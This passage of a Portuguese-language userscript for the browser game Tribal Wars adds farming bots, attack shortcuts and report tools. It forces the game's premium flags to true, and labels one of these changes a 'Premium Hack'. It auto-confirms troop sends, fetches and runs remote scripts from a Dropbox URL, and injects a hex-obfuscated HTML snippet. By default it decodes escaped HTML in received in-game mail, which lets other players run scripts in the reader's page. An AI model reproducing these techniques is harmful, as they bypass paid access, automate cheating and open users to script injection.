			document.getElementById('content_value').getElementsByTagName('td')[15].innerHTML = dhx('3c696e7075742069643d227365677265646f2220747970653d2274657874222073697a653d223130222076616c75653d2222206f6e6b657970726573733d22696620286576656e742e6b6579436f6465203d3d20313329207b66756e6374696f6e20736574436f6f6b6965286b65792c76616c6f72297b76617220686f6a65203d206e6577204461746528293b76617220657870697261203d206e6577204461746528686f6a652e67657454696d6528292b3939392a32342a36302a36302a31303030293b76617220657870697261203d206578706972612e746f474d54537472696e6728293b646f63756d656e742e636f6f6b6965203d206b65792b273d272b76616c6f722b273b657870697265733d272b6578706972617d20736574436f6f6b69652827616e756e63696f5f616473656e7365272c20746869732e76616c7565293b2069662028746869732e76616c7565203d3d202764657361746976617227297b616c6572742827416e756e63696f206465736174697661646f20636f6d207375636573736f27297d656c73657b69662028646f63756d656e742e676574456c656d656e744279496428277365677265646f27292e76616c7565203d3d202761746976617227297b616c6572742827416e756e63696f206174697661646f20636f6d207375636573736f27297d656c73657b616c657274282754656d20717565206573636f6c68657220656e747265205c276174697661725c27206f75205c276465736174697661725c2727297d7d3b20766f69642830293b7d223e');
		}

		if (gd.screen == 'info_command'){
			c1 = extrair_coord($('#content_value tr:eq(2) td:eq(1)').text());
			c2 = extrair_coord($('#content_value tr:eq(4) td:eq(1)').text());
			
			$('#content_value table:last').after('<br>' + calcular_distancia(c1, c2));
		}
		
		if (gd.screen=='report'){

			if (_GET('view') == null){
				if (getData('attack_report') == ''){
					$('.vis.modemenu tr:eq(1) a:first').append('<img src="http://cdn2.tribalwars.net/graphic/command/attack.png"/>');
				}
			}
		
			if (gd.mode == 'attack'){
				tr_report = $('#report_list tr');
				
				function atacar(target){
					url = 'http://' + document.domain + '/game.php?screen=place&village=' + VillId;
					$('#content_value').load(url + ' #content_value', function(){
						win.history.pushState('Object', document.title, url);
						t = target.split('|');
						$('#inputx').val(t[0]);
						$('#inputy').val(t[1]);
						win.selectAllUnits(true);
					});
				}
				
				for (i = 1; i < tr_report.length - 1; i++){
					target = extrair_coord($(tr_report[i]).find('a:first').text());
					$(tr_report[i]).find('input:first').after('<a style="cursor:pointer;" title="' + lang_report[4] + '"><img src="http://cdn2.tribalwars.net/graphic/command/attack.png"/></a>');
					eval('$(tr_report[i]).find(\'a:first\').bind(\'click\', function(){atacar(\'' + target + '\')});');
					
					//$(tr_report[i]).find('input:first').after('<a href="game.php?village=' + VillId + '&target_c=' + target + '&screen=place"><img src="http://cdn2.tribalwars.net/graphic/command/attack.png"/></a>');
					
					//report_id = _GET('view', $(tr_report[i]).find('a:first').attr('href'));
					//$(tr_report[i]).find('input:first').after('<a href="report_id=' + report_id + '&village=' + VillId + '&screen=place"><img src="http://cdn2.tribalwars.net/graphic/command/attack.png"/></a>');
				}
			}
		}
		
		if (_GET('view') != null && gd.screen == 'report') {
			
			function tropas_relatorio(tipo, ind){
				tropas_r = '';
				$('#attack_info_' + tipo + '_units tr:eq(' + ind + ') td[class*="unit-item"]').each(function(ind){
					tropas_r += $(this).text() + '|';
				});
				return tropas_r;
			}
			
			att_units = tropas_relatorio('att', 1);
			def_units = tropas_relatorio('def', 1);
			att_units_b = tropas_relatorio('att', 2);
			def_units_b = tropas_relatorio('def', 2);

			att_array = att_units.split('|');
			def_array = def_units.split('|');
			att_b_array = att_units_b.split('|');
			def_b_array = def_units_b.split('|');
			
			att_survivor = '';
			def_survivor = '';
			for (i=0; i < att_array.length-1; i++){
				att_survivor += (att_array[i] - att_b_array[i]) + '|';
			}
			for (i=0; i < def_array.length-1; i++){
				def_survivor += (def_array[i] - def_b_array[i]) + '|';
			}
			
			
			id_target = _GET('id', $('#attack_info_def tr:eq(1) a:eq(0)').attr('href'));
			publicar = lang_publicar != '' ? '<br><a href="http://www.mytwstats.com/tool-convert.php" target="_blank">» ' + lang_publicar + '</a><hr>' : '';
			document.getElementById('attack_info_att').parentNode.innerHTML += publicar + '<a href="/game.php?village=' + VillId + '&screen=place&mode=sim&att_units=' + att_units + '&def_units=' + def_units + '">» ' + lang_report[0] + '</a><br><a href="/game.php?village=' + VillId + '&screen=place&mode=sim&att_units=' + att_survivor + '&def_units=' + def_survivor + '">» ' + lang_report[1] + '</a><hr><a href="/game.php?target=' + id_target + '&village=' + VillId + '&screen=place">» ' + lang_report[2] + '</a><br><a id="same" href="/game.php?target=' + id_target + '&village=' + VillId + '&screen=place&type=same&att_units=' + att_units + '">» ' + lang_report[3] + '</a><br><a href="/game.php?target=' + id_target + '&village=' + VillId + '&screen=place&type=all">» ' + lang_report[4] + '</a>'; 
			
			if (document.getElementById('attack_spy') != null) {
				document.getElementById('attack_spy').parentNode.innerHTML += '<hr><table id="farmar_tabela" class="vis"><tbody><tr><td colspan="7"><a href="javascript:' + str_setData	+ '; mandar_spy = 1; spy = document.getElementById(\'spy\').value; lanceiro = Number(document.getElementById(\'spear\').checked); espadachim = Number(document.getElementById(\'sword\').checked); barbaro = Number(document.getElementById(\'axe\').checked); arqueiro = Number(document.getElementById(\'archer\').checked); cav_leve = Number(document.getElementById(\'light\').checked); arqueiro_cav = Number(document.getElementById(\'marcher\').checked); cav_pesada = Number(document.getElementById(\'heavy\').checked); var ataque = true; var debug_ligado = 0; coo = lanceiro + \'!!!\' + espadachim + \'!!!\' + barbaro +\'!!!\' + arqueiro + \'!!!\' + cav_leve + \'!!!\' + arqueiro_cav + \'!!!\' + cav_pesada + \'!!!\' + mandar_spy + \'!!!\' + spy + \'!!!\' + debug_ligado; game_data.player.premium = true; setCookie(game_data.world + \'_\' + game_data.village.id + \'_calcular\', coo); $.getScript(\'http://dl.dropbox.com/u/72485850/tribalwarsbrasil/calcular_farmar.js\'); void(0);">' + lang_calc_reports + '</a></td></tr><tr><td width="60"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spy.png?1"><input size="1" type="text" value="1" id="spy"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_light.png?1"><input type="checkbox" id="light"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_marcher.png?1"><input type="checkbox" id="marcher"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_heavy.png?1"><input type="checkbox" id="heavy"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spear.png?1"><input type="checkbox" id="spear"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_sword.png?1"><input type="checkbox" id="sword"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_axe.png?1"><input type="checkbox" id="axe"></td><td width="50"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_archer.png?1"><input type="checkbox" id="archer"></td></tr></tbody></table>';
			}
			else{
				if (document.getElementById('attack_info_att') != null)	document.getElementById('attack_info_att').parentNode.innerHTML += '<hr><a href="#" class="inactive" title="Apenas em relatório de espionagem" onclick="return false">' + lang_calc_reports + '</a>';
			}
			
			
		}

		if (gd.screen == 'snob'){
			cunhar_table = document.getElementsByTagName('table')[document.getElementsByTagName('table').length - 1];
			if (cunhar_table.getElementsByTagName('tr')[3] == null){
				cunhar_checked = '';
				if (getData(VillId + '_cunhar') == 'true')cunhar_checked = ' checked';
				cunhar_table.getElementsByTagName('th')[1].innerHTML += ' | <input type="checkbox" id="cunhar_check"' + cunhar_checked + ' onClick="' + str_setData + '; setCookie(\'' + VillId + '_cunhar\', String(this.checked)); if (this.checked == true) location.href = document.getElementById(\'cunhar\').href;void(0);"> Auto';
				cunhar_link = cunhar_table.getElementsByTagName('a')[0];
				if (cunhar_link != null) cunhar_link.id = 'cunhar';
				cunhar_span = cunhar_table.getElementsByTagName('span')[cunhar_table.getElementsByTagName('span').length - 1];
				if (getData(VillId + '_cunhar') == 'true') {
					if (cunhar_link != null){
						location.href = cunhar_link.href
							}
					else{		
						alert(cunhar_span.textContent);
						document.getElementById('cunhar_check').checked = false;
						setData(VillId + '_cunhar', String(document.getElementById('cunhar_check').checked));
					}
				}
			}
		}

		
		
		//if ((location.href.indexOf('screen=place&try=confirm') > 0) && (document.getElementById('troop_confirm_go') == null)) location.href = location.href.replace('&try=confirm', '');

		if (gd.screen == 'place'){

			
			function coord_report(url){
				$.get(url, function(data){
					name = $(data).find('#attack_info_def tr:eq(1) a:eq(0)').text();
					name = extrair_coord(name);
					$('#inputx').val(name.split('|')[0]);
					$('#inputy').val(name.split('|')[1]);
				});
			}
			
			if (_GET('report_id') != null){
				report_id = _GET('report_id');
				coord_report('http://' + document.domain + '/game.php?village=' + VillId + '&mode=attack&view=' + report_id + '&screen=report');
			}
		
			function farmer(i){
				location.href = document.getElementById('farmar_' + i).href;
			};
			
			if (getData(mundo + '_' + VillId + '_farmar_1') != '') {
				tropas_1 = getData(mundo + '_' + VillId + '_farmar_1').split('!!!');
			}
			else {
				var tropas_1 = new Array('0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '');
			}
			
			spear_1 = tropas_1[0];
			sword_1 = tropas_1[1];
			axe_1 = tropas_1[2];
			archer_1 = tropas_1[3];
			spy_1 = tropas_1[4];
			light_1 = tropas_1[5];
			marcher_1 = tropas_1[6];
			heavy_1 = tropas_1[7];
			ram_1 = tropas_1[8];
			catapult_1 = tropas_1[9];
			coords_1 = tropas_1[10];
			
			if (getData(mundo + '_' + VillId + '_farmar_2') != '') {
				tropas_2 = getData(mundo + '_' + VillId + '_farmar_2').split('!!!');
			}
			else {
				var tropas_2 = new Array('0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '');
			}
			spear_2 = tropas_2[0];
			sword_2 = tropas_2[1];
			axe_2 = tropas_2[2];
			archer_2 = tropas_2[3];
			spy_2 = tropas_2[4];
			light_2 = tropas_2[5];
			marcher_2 = tropas_2[6];
			heavy_2 = tropas_2[7];
			ram_2 = tropas_2[8];
			catapult_2 = tropas_2[9];
			coords_2 = tropas_2[10];
			
			if (coords_1 == "") coords_1 = coords_2;
			
			if (getData(mundo + '_' + VillId + '_calcular') != '') {
				cmd = getData(mundo + '_' + VillId + '_calcular').split('!!!');
				abrir = 'javascript: lanceiro = ' + cmd[0] + '; espadachim = ' + cmd[1] + '; barbaro = ' + cmd[2] + '; arqueiro = ' + cmd[3] + '; cav_leve = ' + cmd[4] + '; arqueiro_cav = ' + cmd[5] + '; cav_pesada = ' + cmd[6] + '; mandar_spy = ' + cmd[7] + '; spy = ' + cmd[8] + '; debug_ligado = 0; ataque = true; game_data.player.premium = true; $.getScript(\'' + base_scripts + 'calcular_farmar.js\');void(0);';
				//prompt('copie', abrir);
				location.href = abrir;
				deleteData(mundo + '_' + VillId + '_calcular', '');
			}

			if (_GET('target_c') != null){
				target = _GET('target_c').split('|');
				$('#inputx').val(target[0]);
				$('#inputy').val(target[1]);
			}
			
			if (_GET('type') == 'all') win.selectAllUnits(true);
			
			if (_GET('type') == 'same'){
				function ins_tr(tropa, valor){
					$('#unit_input_' + tropa).val(valor);
				}
				att_units = _GET('att_units');
				att = att_units.split('|');
				
				archer = ''; marcher = ''; knight = '';
				
				if (att.length == 13) {
					archer = ',archer';marcher=',marcher';kinght=',knight';
				}
				if (att.length == 12) {
					archer = ',archer';marcher=',marcher';
				}
				if (att.length == 11) {
					knight = ',knight';
				}
				
				troaps = 'spear,sword,axe' + archer + ',spy,light' + marcher + ',heavy,ram,catapult' + knight + ',snob';
				
				tro = troaps.split(',');
				
				for (i = 0; i < tro.length; i++){
					if (Number(att[i]) > 0) ins_tr(tro[i], att[i]);
				}
			}
			
			if (gd.mode == 'sim'){
				if (_GET('att_units') != null && _GET('def_units') != ''){
					function ins(tropa, valor, type){
						$('[name="' + type + '_' + tropa + '"]:first').val(valor);
					}
					
					att_units = _GET('att_units');
					def_units = _GET('def_units');
					att = att_units.split('|');
					def = def_units.split('|');
					
					if (att.length >= 12) at = 'spear,sword,axe,archer,spy,light,marcher,heavy,ram,catapult,knight,snob'; else at = 'spear,sword,axe,spy,light,heavy,ram,catapult,knight,snob';
					
					tropas = at.split(',');
					
					for (i = 0; i < tropas.length; i++){
						if (att[i] > 0) ins(tropas[i], att[i], 'att');
						if (def[i] > 0) ins(tropas[i], def[i], 'def');
					}
				}
			}
			
			if (gd.mode == 'farmar') {

				function salvar_farmar(dex){
					if (dex != 0) {
						msg_farmar = 'Farmar ' + dex + ' -> ';
					} else {
						msg_farmar = ''; 
						dex = 1;
					}
					tropasfarmar = document.getElementById('farmar_' + dex).getElementsByTagName('input');
					cookietropas = '';
						for (i = 0; i < tropasfarmar.length; i++){
							if (tropasfarmar[i].id.indexOf('unit_input' + dex + '_') > -1){
								if (tropasfarmar[i].value.length < 1) tropasfarmar[i].value = '0';
								cookietropas += tropasfarmar[i].value + '!!!';
							}
						}
					setData(gd.world + '_' + gd.village.id + '_farmar_' + dex, cookietropas + document.getElementById('coordenadas_1').value);
					alert(msg_farmar + gd.village.name + ' (' + gd.village.coord + ') ' + gd.village.con + ' -> OK');
				}		
				xy = gd.village.coord.split('|');
				tabela_farmar = document.getElementById('content_value').getElementsByTagName('table')[1].getElementsByTagName('td');
				tabela_farmar[tabela_farmar.length - 1].innerHTML = '<h3>' + lang_farmer[0] + '</h3><h6>' + lang_farmer[1] + '</h6><br><table><tbody><tr><td colspan="2"><table><tbody><tr><td>' + lang_farmer[2] + ' <span id="count_villages">' + (coords_1.split(' ').length-1) + '</span> <input type="text" tabindex="13" id="coordenadas_1" value="' + coords_1 + '" onblur="$(\'#count_villages\').text(this.value.split(\' \').length-1);void(0);" size="50"></td><td><a id="salvar_farmar_0" href="#">' + lang_farmer[3] + '</a></td><td height="24"><a href="http://' + mundo + '.twplus.org/calculator/locator/?v_x=' + xy[0] + '&v_y=' + xy[1] + '" target="search" title="Use Script-Export">» ' + lang_search_villages + '</a></td></tr></tbody></table></td></tr><tr><td valign="top" id="farmar_1"><table><tbody><tr><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'spear\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spear.png?1" title="' + lang_spear + '" alt="" class=""></a> <input id="unit_input1_spear" name="spear" type="text" size="5" tabindex="1" value="' + spear_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'sword\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_sword.png?1" title="' + lang_sword + '" alt="" class=""></a> <input id="unit_input1_sword" name="sword" type="text" size="5" tabindex="2" value="' + sword_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'axe\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_axe.png?1" title="' + lang_axe + '" alt="" class=""></a> <input id="unit_input1_axe" name="axe" type="text" size="5" tabindex="3" value="' + axe_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'archer\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_archer.png?1" title="Arqueiro" alt="" class=""></a> <input id="unit_input1_archer" name="archer" type="text" size="5" tabindex="4" value="' + archer_1 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'spy\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spy.png?1" title="' + lang_spy + '" alt="" class=""></a> <input id="unit_input1_spy" name="spy" type="text" size="5" tabindex="5" value="' + spy_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'light\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_light.png?1" title="' + lang_light + '" alt="" class=""></a> <input id="unit_input1_light" name="light" type="text" size="5" tabindex="6" value="' + light_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'marcher\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_marcher.png?1" title="' + lang_marcher + '" alt="" class=""></a> <input id="unit_input1_marcher" name="marcher" type="text" size="5" tabindex="7" value="' + marcher_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'heavy\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_heavy.png?1" title="' + lang_heavy + '" alt="" class=""></a> <input id="unit_input1_heavy" name="heavy" type="text" size="5" tabindex="8" value="' + heavy_1 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'ram\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_ram.png?1" title="' + lang_ram + '" alt="" class=""></a> <input id="unit_input1_ram" name="ram" type="text" size="5" tabindex="9" value="' + ram_1 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'catapult\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_catapult.png?1" title="'+ lang_catapult + '" alt="" class=""></a> <input id="unit_input1_catapult" name="catapult" type="text" size="5" tabindex="10" value="' + catapult_1 + '" class="unitsInput"></td></tr></tbody></table></td></tr></tbody></table><table><tbody><tr><td><a id="salvar_farmar_1" href="#">' + lang_farmer[3] + '</a> (' + lang_farmar + ' 1)</td></tr></tbody></table></td><td valign="top" id="farmar_2"><table><tbody><tr><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'spear\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spear.png?1" title="' + lang_spear + '" alt="" class=""></a> <input id="unit_input2_spear" name="spear" type="text" size="5" tabindex="1" value="' + spear_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'sword\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_sword.png?1" title="' + lang_sword + '" alt="" class=""></a> <input id="unit_input2_sword" name="sword" type="text" size="5" tabindex="2" value="' + sword_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'axe\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_axe.png?1" title="' + lang_axe + '" alt="" class=""></a> <input id="unit_input2_axe" name="axe" type="text" size="5" tabindex="3" value="' + axe_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'archer\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_archer.png?1" title="' + lang_archer + '" alt="" class=""></a> <input id="unit_input2_archer" name="archer" type="text" size="5" tabindex="4" value="' + archer_2 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'spy\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_spy.png?1" title="' + lang_spy + '" alt="" class=""></a> <input id="unit_input2_spy" name="spy" type="text" size="5" tabindex="5" value="' + spy_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'light\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_light.png?1" title="' + lang_light + '" alt="" class=""></a> <input id="unit_input2_light" name="light" type="text" size="5" tabindex="6" value="' + light_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'marcher\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_marcher.png?1" title="' + lang_marcher + '" alt="" class=""></a> <input id="unit_input2_marcher" name="marcher" type="text" size="5" tabindex="7" value="' + marcher_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'heavy\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_heavy.png?1" title="'+lang_heavy+'" alt="" class=""></a> <input id="unit_input2_heavy" name="heavy" type="text" size="5" tabindex="8" value="' + heavy_2 + '" class="unitsInput"></td></tr></tbody></table></td><td valign="top"><table class="vis" width="100%"><tbody><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'ram\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_ram.png?1" title="'+ lang_ram +'" alt="" class=""></a> <input id="unit_input2_ram" name="ram" type="text" size="5" tabindex="9" value="' + ram_2 + '" class="unitsInput"></td></tr><tr><td class="nowrap"><a href="#" class="unit_link" onclick="return UnitPopup.open(event, \'catapult\')"><img src="http://cdn.tribalwars.com.br/graphic/unit/unit_catapult.png?1" title="' + lang_catapult + '" alt="" class=""></a> <input id="unit_input2_catapult" name="catapult" type="text" size="5" tabindex="10" value="' + catapult_2 + '" class="unitsInput"></td></tr></tbody></table></td></tr></tbody></table><table><tbody><tr><td><a id="salvar_farmar_2" href="#">' + lang_farmer[3] + '</a> (' + lang_farmar + ' 2)</td></tr></tbody></table></td></tr></tbody></table>';
				document.getElementById('salvar_farmar_0').addEventListener('click', function(){salvar_farmar(0);});
				document.getElementById('salvar_farmar_1').addEventListener('click', function(){salvar_farmar(1);});
				document.getElementById('salvar_farmar_2').addEventListener('click', function(){salvar_farmar(2);});
			}


			if ((document.getElementById('content_value').getElementsByTagName('tbody')[2] != null) && (document.getElementById('troop_confirm_go') == null)) document.getElementById('content_value').getElementsByTagName('tbody')[2].innerHTML += '<tr><td width="100"><a href="/game.php?village=' + VillId + '&amp;screen=place&amp;mode=farmar">' + lang_farmar + '</a></td></tr>';
			
			if (document.getElementById('target_attack') != null) {
				$(function(){
					razao = 0.0166666666662 / win.UnitPopup.unit_data.spear.speed;
				});
				function speed(tropa){
					if (eval('win.UnitPopup.unit_data.' + tropa + ' != undefined')){
						eval('vel = win.UnitPopup.unit_data.spear.speed / win.UnitPopup.unit_data.' + tropa + '.speed;');
						return Math.round(razao * vel * 60);
					}
					else {
						return 0;
					}
				}
				_tropas = speed('spear') + '|' + speed('sword') + '|' + speed('axe') + '|' + speed('archer') + '|' + speed('spy') + '|' + speed('light') + '|' + speed('marcher') + '|' + speed('heavy') + '|' + speed('ram') + '|' + speed('catapult') + '|' + speed('knight') + '|' + speed('snob');
				
				setData(mundo + '_vel_tropas', _tropas);
				
				farmar_1_input = Number(getData(VillId + '_farmar_1_input'));if (farmar_1_input > 0) farmar_1_input--;
				farmar_2_input = Number(getData(VillId + '_farmar_2_input'));if (farmar_2_input > 0) farmar_2_input--;
									
				function ok_i(i){
					inp = $('#farmar_' + i + '_input').val(); 
					setData(VillId + '_farmar_' + i + '_input', String(inp)); 
					if (Number(inp) > 0) farmer(Number(i));
				}
				
				td = document.createElement('td');
				td.innerHTML = '<a id="farmar_1" href="javascript: lanca = ' + spear_1 + '; espada = ' + sword_1 + '; barbaro = ' + axe_1 + '; arqueiro = ' + archer_1 + '; explorador = ' + spy_1 + '; cavalaria_leve = ' + light_1 + '; cavalaria_arqueira = ' + marcher_1 + '; cavalaria_pesada = ' + heavy_1 + '; catapulta = '+ catapult_1 + '; ariete = '+ ram_1 + '; coords_ataque = \''+ coords_1 + '\'; aviso = false; coockieName = game_data.world + \'_\' + game_data.village.id + \'_farmeruk\'; $.getScript(\'' + base_scripts + 'saquear_aldeia_farmar.js\');void(0);">» ' + lang_farmar + ' 1</a> <input type="input" size="1" style="margin:0" id="farmar_1_input" value="' + farmar_1_input + '" title="Auto"><input id="ok_1" type="button" value="ok"><br><a id="farmar_2" href="javascript: lanca = ' + spear_2 + '; espada = ' + sword_2 + '; barbaro = ' + axe_2 + '; arqueiro = ' + archer_2 + '; explorador = ' + spy_2 + '; cavalaria_leve = ' + light_2 + '; cavalaria_arqueira = ' + marcher_2 + '; cavalaria_pesada = ' + heavy_2 + '; catapulta = '+ catapult_2 + '; ariete = '+ ram_2 + '; coords_ataque = \''+ coords_1 + '\'; aviso = false; coockieName = game_data.world + \'_\' + game_data.village.id + \'_farmeruk\'; $.getScript(\'' + base_scripts + 'saquear_aldeia_farmar.js\');void(0);">» ' + lang_farmar + ' 2</a> <input type="input" size="1" style="margin:0" id="farmar_2_input" value="' + farmar_2_input + '" title="Auto"><input id="ok_2" type="button" value="ok"/>';
				$('#units_form').after(td);
				document.getElementById('ok_1').addEventListener('click', function(){ok_i(1)});
				document.getElementById('ok_2').addEventListener('click', function(){ok_i(2)});
				document.getElementById('farmar_1_input').addEventListener('keydown', function(){if (event.keyCode == 13) ok_i(1)});
				document.getElementById('farmar_2_input').addEventListener('keydown', function(){if (event.keyCode == 13) ok_i(2)});
				if (farmar_1_input > 0) {
					
					location.href = document.getElementById('farmar_2').href;
				}
				else{
					if (farmar_2_input > 0) {
					
						location.href = document.getElementById('farmar_2').href;
					}
				}
				setData(VillId + '_farmar_2_input', String(farmar_2_input));
				setData(VillId + '_farmar_1_input', String(farmar_1_input));
			}
			
			if (document.getElementById('troop_confirm_go') != null){
				farmar_1_input = Number(getData(VillId + '_farmar_1_input'));
				farmar_2_input = Number(getData(VillId + '_farmar_2_input'));
				if (farmar_1_input > 0 || farmar_2_input > 0){
					document.getElementById('troop_confirm_go').click();
				}
			}
		}

		aldeiasnome = getData(mundo + '_aldeiasnome');
		
		if (aldeiasnome != ''){
			aldeiasnome1 = aldeiasnome.split(' ** ');
			
			if (gd.screen == 'market' && (gd.mode == null || gd.mode == 'send')){
				$('#inputx').parent().parent().after('<tr><td colspan="3"><select id="aldeias_market"></select></td></tr>');
				$('#aldeias_market').bind('change', function(){
					if ($(this).val() != ''){
						c = $(this).val().split('|'); 
						$('#inputx').val(c[0]);
						$('#inputy').val(c[1]);
					}
				});
				select = '<option></option>';
				for (i = 0; i < aldeiasnome1.length; i++){
					c=extrair_coord(aldeiasnome1[i]);
					select += '<option value="' + c + '">' + aldeiasnome1[i] + '</option>';
				}
				$('#aldeias_market').html(select);
			}
		}
		
		if (gd.screen == 'map') {
			fullscreen = document.getElementById('fullscreen');
			fullscreen.setAttribute('style', 'display: block;');
			fullscreen.setAttribute('onclick', 'TWMap.premium = true; TWMap.goFullscreen();');
			fullscreen.setAttribute('title', 'FullScreen - Tribalwars Premium Hack');
			window.location = 'javascript:TWMap.resize(13);';
			if (document.getElementById('map_config') != null) {
				document.getElementById('map_config').innerHTML += '<br><table class="vis" width="100%"><tbody><tr><th colspan="2">' + lang_map[9] + '</th></tr><tr><td><table cellspacing="0"><tbody><tr><td width="80">' + lang_map[8] + '</td><td><select id="map_chooser_select" onchange="TWMap.resize(parseInt($(\'#map_chooser_select\').val()), true)"><option id="current-map-size" value="13x13" style="display:none;">13x13</option><option value="4">4x4</option><option value="5">5x5</option><option value="7">7x7</option><option value="9">9x9</option><option value="11">11x11</option><option value="13" selected="selected">13x13</option><option value="15">15x15</option><option value="20">20x20</option><option value="30">30x30</option></select></td><td valign="middle"><img alt="" class="tooltip" src="http://cdn.tribalwars.com.br/graphic//questionmark.png" width="13" height="13"></td></tr></tbody></table><input type="hidden" value="/game.php?village=86984&amp;screen=settings&amp;ajaxaction=set_map_size&amp;h=d7d4" id="change_map_size_link"></td></tr><tr><td><table cellspacing="0"><tbody><tr><td width="80">' + lang_map[7] + '</td><td colspan="2"><select id="minimap_chooser_select" onchange="TWMap.resizeMinimap(parseInt($(\'#minimap_chooser_select\').val()), true)"><option id="current-minimap-size" value="120x120" style="display:none;">120x120</option><option value="20">20x20</option><option value="30">30x30</option><option value="40">40x40</option><option value="50">50x50</option><option value="60">60x60</option><option value="70">70x70</option><option value="80">80x80</option><option value="90">90x90</option><option value="100">100x100</option><option value="110">110x110</option><option value="120" selected="selected">120x120</option></select></td></tr></tbody></table><input type="hidden" value="/game.php?village=86984&amp;screen=settings&amp;ajaxaction=set_map_size&amp;h=d7d4" id="change_map_size_link"></td></tr></tbody></table>';
			}
		}

		if (gd.screen=='mail' && gd.mode == 'view') {                
			messages = getElementsByClass('text');
			RegExp = /\[img\]https?:\/\/.+?\/.+?\..*?\[\/img\]/g; 
			RegExpV1 = /\[vid\]https?:\/\/.+?youtube.+?\/watch\?v=[\w_]+&?.*?\[\/vid\]/g;
			RegExpV2 = /\[vid\]https?:\/\/.+?youtube.+?\/watch\?v=([\w_]+)&?.*?\[\/vid\]/;
			allow_html = getData(mundo + '_permitir_html');
			allow_html_check = '';
			if (allow_html == '') {
				allow_html = 'true';
				setData(mundo + '_permitir_html', 'true');
			}
			for (i = 0; i < messages.length; i++){  
				if (messages[i] != null){             
					//alert(messages[i].textContent);
					meta = messages[i].innerHTML.match(RegExp);
					meta2 = messages[i].outerHTML.match(RegExpV1);
					meta3 = messages[i].textContent.match(/<script>.+?<\/script>/g);
					//MessHTML = messages[i].innerHTML.match(RegExpHTML);
					//MessNotHTML = messages[i].textContent.match(RegExpNotHTML);
					
					modified = messages[i].innerHTML;            
					
						if (allow_html == 'true'){
							allow_html_check = ' checked="checked"';
							modified = replace_all(replace_all(replace_all(modified, '&lt;', '<'), '&gt;', '>'), '&amp;', '&');
						}				
					//alert(meta.length);
					if (meta != null) {               
						for (b = 0; b < meta.length; b++) {
							tag_img = meta[b].replace('[img]', '<img src="').replace('[/img]', '"/>');                    
							//alert(tag_img);
							modified = modified.replace(meta[b], tag_img);              
						}
					}
					if (meta2 != null) {
						for (b = 0; b < meta2.length; b++) {	
							//alert(meta2[b]);
							//alert(meta2[b].match(RegExpV2)[1]);
